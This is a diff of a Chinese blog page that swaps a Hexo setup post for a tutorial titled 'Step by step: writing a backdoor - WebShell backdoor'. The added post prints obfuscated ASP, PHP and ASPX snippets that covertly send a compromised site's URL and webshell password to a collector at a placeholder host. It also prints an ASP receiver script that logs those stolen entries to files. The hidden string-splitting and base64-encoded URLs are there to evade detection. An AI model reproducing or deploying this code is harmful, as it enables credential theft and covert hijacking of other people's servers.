@@ -84,19 +84,28 @@
 
 
 
-<meta name="description" content="从昨天早上折腾到晚上…其实早就配置好了，然后同步的时候一直提示公钥不正确，简直是气的发疯。。。然后我重启了一下笔记本一切ok了！。。。
-正文整理一下会常用到的命令1234$ hexo new &quot;My New Post&quot;$ hexo server$ hexo generate$ hexo deploy">
+<meta name="description" content="写这篇文章的目的很单纯!
+正文  好了，废话不多说，一个WebShell后门的必须条件有三个
+  1、1个域名  2、1个收信文件  3、1个WebShell(asp|php|aspx木马)
+  asp的后门代码如下：
+  123456789101112XmlSend(&quot;http://www.xxx.com/backdoor.asp?shell=&quot;&amp;amp;Request.ServerVari">
 <meta property="og:type" content="article">
-<meta property="og:title" content="终于折腾完了!">
-<meta property="og:url" content="http://0xmg.github.io/2016/06/12/终于折腾完了!/index.html">
+<meta property="og:title" content="手把手教你写后门 - WebShell后门">
+<meta property="og:url" content="http://0xmg.github.io/2016/06/13/WebShell BackDoor/index.html">
 <meta property="og:site_name" content="Mushroom’s Blog">
-<meta property="og:description" content="从昨天早上折腾到晚上…其实早就配置好了，然后同步的时候一直提示公钥不正确，简直是气的发疯。。。然后我重启了一下笔记本一切ok了！。。。
-正文整理一下会常用到的命令1234$ hexo new &quot;My New Post&quot;$ hexo server$ hexo generate$ hexo deploy">
-<meta property="og:updated_time" content="2016-06-13T10:44:54.000Z">
+<meta property="og:description" content="写这篇文章的目的很单纯!
+正文  好了，废话不多说，一个WebShell后门的必须条件有三个
+  1、1个域名  2、1个收信文件  3、1个WebShell(asp|php|aspx木马)
+  asp的后门代码如下：
+  123456789101112XmlSend(&quot;http://www.xxx.com/backdoor.asp?shell=&quot;&amp;amp;Request.ServerVari">
+<meta property="og:updated_time" content="2016-06-13T14:43:59.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="终于折腾完了!">
-<meta name="twitter:description" content="从昨天早上折腾到晚上…其实早就配置好了，然后同步的时候一直提示公钥不正确，简直是气的发疯。。。然后我重启了一下笔记本一切ok了！。。。
-正文整理一下会常用到的命令1234$ hexo new &quot;My New Post&quot;$ hexo server$ hexo generate$ hexo deploy">
+<meta name="twitter:title" content="手把手教你写后门 - WebShell后门">
+<meta name="twitter:description" content="写这篇文章的目的很单纯!
+正文  好了，废话不多说，一个WebShell后门的必须条件有三个
+  1、1个域名  2、1个收信文件  3、1个WebShell(asp|php|aspx木马)
+  asp的后门代码如下：
+  123456789101112XmlSend(&quot;http://www.xxx.com/backdoor.asp?shell=&quot;&amp;amp;Request.ServerVari">
 
 
 
@@ -117,9 +126,9 @@
 
 
 
-  <link rel="canonical" href="http://0xmg.github.io/2016/06/12/终于折腾完了!/"/>
+  <link rel="canonical" href="http://0xmg.github.io/2016/06/13/WebShell BackDoor/"/>
 
-  <title> 终于折腾完了! | Mushroom’s Blog </title>
+  <title> 手把手教你写后门 - WebShell后门 | Mushroom’s Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -239,7 +248,7 @@
             
             
               
-                终于折腾完了!
+                手把手教你写后门 - WebShell后门
               
             
           </h1>
@@ -251,8 +260,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-06-12T15:52:26+08:00" content="2016-06-12">
-              2016-06-12
+            <time itemprop="dateCreated" datetime="2016-06-13T22:43:59+08:00" content="2016-06-13">
+              2016-06-13
             </time>
           </span>
 
@@ -266,7 +275,7 @@
 
           
           
-             <span id="/2016/06/12/终于折腾完了!/" class="leancloud_visitors" data-flag-title="终于折腾完了!">
+             <span id="/2016/06/13/WebShell BackDoor/" class="leancloud_visitors" data-flag-title="手把手教你写后门 - WebShell后门">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -288,8 +297,14 @@
       
 
       
-        <p>  从昨天早上折腾到晚上…其实早就配置好了，然后同步的时候一直提示公钥不正确，简直是气的发疯。。。然后我重启了一下笔记本一切ok了！。。。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>整理一下会常用到的命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br><span class="line">$ hexo server</span><br><span class="line">$ hexo generate</span><br><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></p>
+        <p>  写这篇文章的目的很单纯!</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>  好了，废话不多说，一个WebShell后门的必须条件有三个</p>
+<p>  1、1个域名<br>  2、1个收信文件<br>  3、1个WebShell(asp|php|aspx木马)</p>
+<p>  asp的后门代码如下：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XmlSend(<span class="string">"http://www.xxx.com/backdoor.asp?shell="</span>&amp;Request.ServerVariables(<span class="string">"Server_Name"</span>)&amp;request(<span class="string">"url"</span>)&amp;&amp;UserPass)</span><br><span class="line">Function XmlSend(Posturl)</span><br><span class="line">dim w</span><br><span class="line">w=<span class="string">"^w^inhttp.^wi^nhttprequest.5.1"</span></span><br><span class="line">Posturl=replace(trim(Posturl),vbcrlf,<span class="string">""</span>)</span><br><span class="line">on error resume next</span><br><span class="line"><span class="built_in">set</span> http= CreateObject(replace(w,<span class="string">"^"</span>,<span class="string">""</span>))</span><br><span class="line">http.open <span class="string">"POST"</span>,Posturl,<span class="literal">false</span></span><br><span class="line">http.send</span><br><span class="line">Set http=Nothing</span><br><span class="line">End Function</span><br><span class="line"> `</span><br></pre></td></tr></table></figure>
+<p>  php的后门代码如下:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">set</span>_time_<span class="built_in">limit</span>(100);</span><br><span class="line"><span class="variable">$slstss</span>=<span class="string">"fi"</span>.<span class="string">"le_"</span>.<span class="string">"ge"</span>.<span class="string">"t_c"</span>.<span class="string">"onten"</span>.<span class="string">"ts"</span>;</span><br><span class="line"><span class="variable">$raworistr</span>=<span class="string">'%'</span>.<span class="string">'@'</span>.<span class="string">'^'</span>.<span class="string">'*'</span>.<span class="string">'('</span>.<span class="string">'&amp;'</span>.<span class="string">'!'</span>.<span class="string">'#'</span>;</span><br><span class="line"><span class="variable">$serveru</span> = <span class="variable">$_SERVER</span> [<span class="string">'HTTP_HOST'</span>].<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="variable">$dedeedoc</span>=<span class="string">"b"</span>.<span class="string">"ase6"</span>.<span class="string">"4_d"</span>.<span class="string">"ec"</span>.<span class="string">"od"</span>.<span class="string">"e"</span>;</span><br><span class="line"><span class="variable">$serverp</span> = <span class="variable">$psw</span>;</span><br><span class="line"><span class="variable">$rawstruri</span>=<span class="string">'aHR0cDovL3d3dy54eHguY29tL2JhY2tkb29yLmFzcD9zaGVsbD0='</span>;</span><br><span class="line"><span class="variable">$rawtargetu</span>=str_replace(<span class="variable">$raworistr</span>,<span class="string">''</span>,<span class="variable">$rawstruri</span>);</span><br><span class="line"><span class="variable">$ropcyiu</span> = <span class="variable">$dedeedoc</span>(<span class="variable">$rawtargetu</span>);</span><br><span class="line"><span class="variable">$uistauast</span>=<span class="variable">$ropcyiu</span>.<span class="variable">$serveru</span>.<span class="string">'|'</span>.<span class="variable">$serverp</span>;</span><br><span class="line"><span class="variable">$uistauast</span>=urldecode(<span class="variable">$uistauast</span>);</span><br><span class="line"><span class="variable">$rubote</span>=<span class="variable">$slstss</span>(<span class="variable">$uistauast</span>);</span><br></pre></td></tr></table></figure></p>
+<p>  aspx的后门代码如下:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  try</span><br><span class="line">&#123;</span><br><span class="line">    WebClient client = new WebClient();</span><br><span class="line">    client.DownloadString(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String((<span class="string">" aHR0cDovL3d3dy54eHguY29tL"</span>.TrimStart().Replace(<span class="string">"%"</span>, string.Empty) + <span class="string">"2JhY2tkb29yLmFzcD9zaGVsbD0= "</span>.TrimEnd().Replace(<span class="string">"#"</span>, string.Empty)))) + this.Request.Url.ToString() + <span class="string">"|"</span> + this.B<span class="keyword">in</span>_TextBox_Login.Text);</span><br><span class="line"> &#125;</span><br><span class="line">catch (Exception)</span><br><span class="line"> &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>  shell.asp收信的代码如下:<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  &lt;%</span><br><span class="line">Function WriteTxt(file,date)</span><br><span class="line">  SitePath = Server.Mappath(<span class="string">"/mgWebShell00544"</span>) &amp; file</span><br><span class="line">  Set FSO=Server.CreateObject(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line">  IF FSO.FileExists(SitePath) Then</span><br><span class="line">  Set MyFile=FSO.OpenTextFile(SitePath,8)<span class="string">'打开文件</span><br><span class="line">  tmp = FSO.OpenTextfile(SitePath,1, False).Readall</span><br><span class="line">  If Instr(tmp, date) = 0 Then </span><br><span class="line">  MyFile.WriteLine("URL="&amp;date)</span><br><span class="line">  Set MyFile=Nothing</span><br><span class="line">  Set FSO=Nothing</span><br><span class="line">  Else</span><br><span class="line">  End If</span><br><span class="line"></span><br><span class="line">  Else</span><br><span class="line">  Set FSO=Server.CreateObject("Scripting.FileSystemObject")</span><br><span class="line">  Call FSO.CreateTextFile(SitePath, True)</span><br><span class="line">  Set MyFile=FSO.OpenTextFile(SitePath,8)'</span>打开文件</span><br><span class="line">  MyFile.WriteLine(<span class="string">"URL="</span>&amp;date)</span><br><span class="line">  Set MyFile=Nothing</span><br><span class="line">  Set FSO=Nothing </span><br><span class="line">  </span><br><span class="line">  End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">If Request.QueryString&lt;&gt;<span class="string">""</span> Then </span><br><span class="line">sb = Request.QueryString(<span class="string">"sb"</span>)</span><br><span class="line">Call WriteTxt(<span class="string">"\"&amp;Month(now())&amp;"</span>----------<span class="string">"&amp;Day(now())&amp;"</span>.txt<span class="string">",sb)</span><br><span class="line">End If</span><br><span class="line">%&gt;</span></span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -314,13 +329,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2016/06/12/终于折腾完了!/" rel="next" title="终于折腾完了!">
+                <i class="fa fa-chevron-left"></i> 终于折腾完了!
+              </a>
+            
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/06/13/WebShell BackDoor/" rel="prev" title="手把手教你写后门 - WebShell后门">
-                手把手教你写后门 - WebShell后门 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
